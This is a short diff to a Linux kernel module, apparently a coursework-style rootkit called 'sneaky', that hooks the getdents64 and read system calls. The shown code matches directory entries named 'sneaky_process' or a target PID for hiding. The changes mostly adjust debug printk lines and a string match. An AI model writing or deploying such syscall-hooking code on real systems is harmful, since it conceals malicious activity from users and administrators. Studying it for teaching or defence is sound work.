@@ -75,7 +75,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 
   while(curr_pos < original_result) {
     if((strcmp(curr_dirp->d_name, "sneaky_process") == 0) || (strcmp(curr_dirp->d_name, pid_txt) == 0)){
-      printk(KERN_INFO "File name %s \n", curr_dirp->d_name);
+      //printk(KERN_INFO "File name %s \n", curr_dirp->d_name);
       break;
     }
     curr_pos += curr_dirp->d_reclen;
@@ -104,9 +104,9 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
   int sneaky_result = original_result;
 
   char * original_buf = regs->si;
-  if(strncmp(original_buf, "sneaky_mod", 10) == 0){
-    char * sneaky_buf = strchr(original_buf, '\n');
-    printk(KERN_INFO "Sneaky read%s \n", sneaky_buf);
+  if(strstr(original_buf, "sneaky_mod") != NULL){
+    //char * sneaky_buf = strchr(original_buf, '\n');
+    printk(KERN_INFO "Sneaky read %s \n", original_buf);
   }
   return sneaky_result;
 }
